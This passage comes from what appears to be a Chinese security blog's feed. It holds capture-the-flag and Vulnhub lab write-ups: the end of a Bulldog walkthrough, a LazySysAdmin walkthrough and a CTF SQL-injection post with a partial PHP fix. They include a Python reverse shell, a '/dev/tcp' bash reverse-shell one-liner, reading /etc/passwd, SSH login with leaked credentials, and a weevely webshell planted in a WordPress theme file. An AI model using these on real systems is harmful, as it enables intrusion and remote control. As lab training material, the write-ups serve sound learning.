class="token punctuation">)</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我保存为shell.py文件，然后在Kali上面使用apache开启一个简单的http服务器，kali自带apache，开启命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> apache2 start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就可以通过IP地址来访问kali的web网页了，之后我们需要做的是把python文件放在网站目录下面，如下图</p><p><img src="/images/wordimage/2022/0322/shellpy.png"></p><p>之后就可以在上面找到的执行shell命令的地方下载我们刚才准备的python文件了，如下图，下载成功。</p><p><img src="/images/wordimage/2022/0322/wgetshell.png"></p><p>然后我们在KALI开启监听，然后回到网站运行python即可。</p><p><img src="/images/wordimage/2022/0322/nclnvp.png" alt="kali开启监听"></p><p>如下图执行反弹脚本</p><p><img src="/images/wordimage/2022/0322/pythonshell.png"></p><p>kali接收反弹获得shell，如下图。</p><p><img src="/images/wordimage/2022/0322/succshell.png"></p><hr><h4 id="2-1另外一种反弹shell的方法"><a href="#2-1另外一种反弹shell的方法" class="headerlink" title="2.1另外一种反弹shell的方法"></a>2.1另外一种反弹shell的方法</h4><p>可以使用bash反弹的方法，最经典的就是如下反弹shell命令</p><blockquote><p>bash -i &gt;&amp; /dev/tcp/192.168.1.28/6666 0&gt;&amp;1</p></blockquote><p>经过测试，在控制台输入如下命令能成功反弹，echo命令反弹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"bash -i >&amp; /dev/tcp/192.168.1.18/6666 0>&amp;1"</span> <span class="token operator">|</span> <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图可以成功反弹没有报错。</p><p><img src="/images/wordimage/2022/0322/shellnc.png"></p><hr><h3 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h3><p>我们进入了系统就需要提权，首先查看有那些用户命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后发现，有<code>django</code>和<code>bulldogadmin</code>两个用户，直接去home目录查看是否有什么东西。</p><p><img src="/images/wordimage/2022/0322/users.png"></p><p>经过一番查找django用户没啥东西可以利用，但是在bulldogadmin目录下面发现了隐藏文件,如下图。</p><p><img src="/images/wordimage/2022/0322/yincang.png"></p><p>然后进入<code>.hiddenadmindirectory</code>这个隐藏目录然后里面有两个文件一个是<code>note</code>一个是<code>customPermissionApp</code>，其中note只是一封信，没有什么可以利用的东西<code>customPermissionApp</code>打开是一堆乱码，这里使用strings打开，内容如下图，发现了东西类似于密码，然后去掉H。</p><p><img src="/images/wordimage/2022/0322/password.png"></p><p>去掉H之后就是SUPER ultHimate PASSWORD you CANT get的字样，为什么这样？因为猜的，纯靠猜。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">SUPERultHimatePASSWORDyouCANTget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后直接切换到root用户，发现切换不了，那就更换shell。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">"import pty; pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后输入命令切换到root用户，并且输入上面得到的密码<code>SUPERultimatePASSWORDyouCANTget</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现可以切换到root用户，提权结束。</p><p><img src="/images/wordimage/2022/0322/root.png"></p><hr><h2 id="三-总结"><a href="#三-总结" class="headerlink" title="三.总结"></a>三.总结</h2><p>纯纯靠猜，到后面提权看了一下别人的WP，我就懵逼了，我就想知道是什么样的人才知道那一串是密码，是怎么看出来的。。。。可能还是自己太菜了，加油吧！（￣︶￣）↗　。</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-lazyadmin靶机实战</title>
      <link href="/2022/0397bb45ef.html"/>
      <url>/2022/0397bb45ef.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>下载地址:<a href="https://www.vulnhub.com/entry/lazysysadmin-1,205/">https://www.vulnhub.com/entry/lazysysadmin-1,205/</a></p><p>Kali的IP地址:<code>192.168.1.18</code></p><p>靶机IP地址: <code>192.168.1.26</code></p><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>需要发现主机，使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0321/netdiscover.png"></p><hr><h3 id="2-扫描主机"><a href="#2-扫描主机" class="headerlink" title="2.扫描主机"></a>2.扫描主机</h3><p>对主机进行各种端口扫描，和服务扫描命令如下，发现开放了<code>22,80,139,445,3306,6667</code>端口，各种信息都非常的详细</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -O -p <span class="token number">0</span>-65535 <span class="token number">192.168</span>.1.26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0321/nmap%E6%89%AB%E6%8F%8F.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>因为前面扫描出开放了80端口，证明有http服务，直接访问首页如下显示</p><p><img src="/images/wordimage/2022/0321/http.png"></p><p>使用kali自带的dirb工具扫描，命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.1.26/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描结果如下，发现有wordpress和phpmyadmin</p><p><img src="/images/wordimage/2022/0321/wordpress.png"></p><p>然后使用了dirsearch扫描，结果是一样的</p><p><img src="/images/wordimage/2022/0321/dirsearch.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-SSH"><a href="#1-SSH" class="headerlink" title="1.SSH"></a>1.SSH</h3><p>根据前面信息收集，发现了有一个smb服务，我们可以直接尝试连接<code>smb://192.168.1.26</code>，如下图，发现了居然是网站的后台文件！！</p><p><img src="/images/wordimage/2022/0321/smb.png"></p><p>根据一番查找，发现了<code>deets,txt</code>文件里面有猫腻，这个文件内容如下，密码12345？？？</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">CBF Remembering all these passwords.Remember to remove this file and update your password after we push out the server.Password 12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据前面web服务扫描，发现了有wordpress，直接访问<code>http://192.168.1.26/wordpress</code>，反复强调自己的名字是<code>togie</code>是否在按暗示什么？猜测ssh用户是togie密码是12345，尝试连接</p><p><img src="/images/wordimage/2022/0321/togie.png"></p><p>发现连接成功！！！</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">┌──(root㉿kali)-[~]└─# ssh togie@192.168.1.26###################################################################################################                                          Welcome to Web_TR1                                    ##                             All connections are monitored and recorded                         # #                    Disconnect IMMEDIATELY if you are not an authorized user!                   # ##################################################################################################togie@192.168.1.26's password: Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686) * Documentation:  https://help.ubuntu.com/ System information disabled due to load higher than 1.0133 packages can be updated.0 updates are security updates.togie@LazySysAdmin:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/wordimage/2022/0321/sshsucc.png"></p><p>接下来就可以发出灵魂三问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">togie@LazySysAdmin:~$ <span class="token function">id</span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>togie<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>togie<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>togie<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,110<span class="token punctuation">(</span>lpadmin<span class="token punctuation">)</span>,111<span class="token punctuation">(</span>sambashare<span class="token punctuation">)</span>togie@LazySysAdmin:~$ <span class="token builtin class-name">pwd</span>/home/togietogie@LazySysAdmin:~$ <span class="token function">whoami</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/wordimage/2022/0321/id.png"></p><p>接下来就需要提权了，我们查看当前的togie是否可以直接sudo到root用户，使用命令如下查看</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0321/sudo-l.png"></p><p>接下来就简单很多了，直接sudo切换到root用户，结束。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">togie@LazySysAdmin:~$ <span class="token function">sudo</span> -iroot@LazySysAdmin:~<span class="token comment"># id</span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>root@LazySysAdmin:~<span class="token comment"># pwd</span>/rootroot@LazySysAdmin:~<span class="token comment"># whoami</span>rootroot@LazySysAdmin:~<span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/wordimage/2022/0321/sudo-i.png"></p><hr><h3 id="2-wordpress"><a href="#2-wordpress" class="headerlink" title="2.wordpress"></a>2.wordpress</h3><p>根据前面信息收集，发现了wordpress和phpmyadmin，还有一个smb服务，smb服务可以直接访问，就是网站的文件，尝试了，不能直接上传文件，但是能下载文件和查看文件内容，既然这样。</p><p><img src="/images/wordimage/2022/0321/smb.png"></p><p>我们直接查看数据库账户和密码，在<code>wordpress/wp-config.php</code>里面，有数据库账户和密码，如下图所示。</p><blockquote><p>账户：Admin</p><p>密码：TogieMYSQL12345^^</p></blockquote><p><img src="/images/wordimage/2022/0321/database.png"></p><p>这样我们直接登录phpmyadmin，但是发现，无论做什么都做不了，意思就是废的…….</p><p><img src="/images/wordimage/2022/0321/phpmyadmin.png"></p><p>转换思路，万一这个数据库密码可以登录wordpress呢？操作，发现，卧槽！可以！</p><p><img src="/images/wordimage/2022/0321/wordpresssucc.png"></p><p>接下来就非常简单了，可以直接写入一句话了，这里没有使用菜刀或者蚁剑，当然这些也可以，我这里使用的是kali自带的工具<code>weevely</code>，生成木马命令如下，在当前目录生成一个叫做muma.php的文件密码为pass</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">weevely generate pass ./muma.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后把文件内容代码复制到，如下图位置404模板，点击updatefile之后就OK了。</p><p><img src="/images/wordimage/2022/0321/muma.png"></p><p>怎么访问这个404文件呢，路径是<code>/wordpress/wp-content/themes/twentyfifteen/404.php</code>，在kali里面输入如下命令来连接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">weevely http://192.168.1.26/wordpress/wp-content/themes/twentyfifteen/404.php pass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0321/weely.png"></p><p>剩下的操作就和上面一样了。</p><hr><h2 id="三-总结"><a href="#三-总结" class="headerlink" title="三.总结"></a>三.总结</h2><p>全是信息泄露的锅，密码太简单。</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-AWD-Yunnan_2</title>
      <link href="/2022/03688f38e6.html"/>
      <url>/2022/03688f38e6.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>安装AWD环境看👉文章<a href="https://blog.takagisan.top/2022/03185304fd.html">个人AWD搭建</a>。</p><hr><h2 id="一-后台SQL注入"><a href="#一-后台SQL注入" class="headerlink" title="一.后台SQL注入"></a>一.后台SQL注入</h2><p>根据代码审计，发现后台登录路径是<code>/admin</code>，经过测试发现是弱密码，账户和密码都是<code>admin</code>，然后使用万能密码登录的时候报错<code>admin&#39; or 1=1</code>报错如下，猜测有SQL注入漏洞。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">操作数据库失败You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' limit 0,1' at line 1sql:select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name='admin'or 11' limit 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用SQLMAP跑一下，使用的数据包如下👇</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /admin/login.php?action<span class="token operator">=</span>ck_login HTTP/1.1Host: <span class="token number">192.168</span>.1.25:8801User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:98.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/98.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,zh-TW<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>,zh-HK<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.2</span>Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: <span class="token number">69</span>Origin: http://192.168.1.25:8801Connection: closeReferer: http://192.168.1.25:8801/admin/login.phpCookie: <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>pqdtltbscbttpg2fqaelsanv10Upgrade-Insecure-Requests: <span class="token number">1</span><span class="token assign-left variable">user</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">code</span><span class="token operator">=</span>fc61<span class="token operator">&amp;</span><span class="token assign-left variable">submit</span><span class="token operator">=</span>true<span class="token operator">&amp;</span>submit.x<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>submit.y<span class="token operator">=</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后发现确实有SQL注入的漏洞</p><p><img src="/images/wordimage/2022/0319/SQL%E6%B3%A8%E5%85%A5.png"></p><hr><h3 id="1-修复sql注入漏洞"><a href="#1-修复sql注入漏洞" class="headerlink" title="1.修复sql注入漏洞"></a>1.修复sql注入漏洞</h3><p>最简单的，直接砍掉登录功能，怎么也不让你登录就行了，如下图。</p><p><img src="/images/wordimage/2022/0319/%E6%8B%92%E7%BB%9D%E7%99%BB%E5%BD%95.png"></p><p>修改<code>/admin/login.php</code>代码如下，啥也不管直接提示密码不正确</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/**  * ============================================================================  * 您只能在不用于商业目的的前提下对程序代码进行修改和使用； * 不允许对程序代码以任何形式任何目的的再发布。 * ============================================================================ */</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.use_trans_sid'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.auto_start'</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.use_cookies'</span><span class="token punctuation">,</span>   <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir_name</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$admindir</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$dir_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$dir_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'CMS_PATH'</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$admindir</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$dir_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'INC_PATH'</span><span class="token punctuation">,</span> <span class="token constant">CMS_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'includes/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'DATA_PATH'</span><span class="token punctuation">,</span> <span class="token constant">CMS_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'data/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token constant">INC_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'fun.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token constant">DATA_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'confing.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token constant">INC_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'mysql.class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">DATA_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'sys_info.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token constant">DATA_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'sys_info.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysql</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysql</span><span class="token punctuation">(</span><span class="token constant">DB_HOST</span><span class="token punctuation">,</span> <span class="token constant">DB_USER</span><span class="token punctuation">,</span> <span class="token constant">DB_PASSWORD</span><span class="token punctuation">,</span> <span class="token constant">DB_NAME</span><span class="token punctuation">,</span> <span class="token constant">DB_CHARSET</span><span class="token punctuation">,</span> <span class="token constant">DB_PCONNECT</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s_code</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">:</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login_in'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login_in'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">:</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login_in'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">:</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login_in'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:admin.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'login'</span> <span class="token punctuation">:</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'login'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">global</span> <span class="token variable">$_sys</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'template/admin_login.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//判断登录</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ck_login'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">global</span> <span class="token variable">$submit</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$_sys</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">;</span><span class="token variable">$submit</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">fl_html</span><span class="token punctuation">(</span><span class="token function">fl_value</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">fl_html</span><span class="token punctuation">(</span><span class="token function">fl_value</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$submit</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">msg</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'请从登陆页面进入'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">msg</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"密码或用户名不能为空"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_sys</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'safe_open'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_sys</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'safe_open'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'3'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">!=</span> <span class="token variable">$s_code</span><span class="token punctuation">)</span> <span class="token 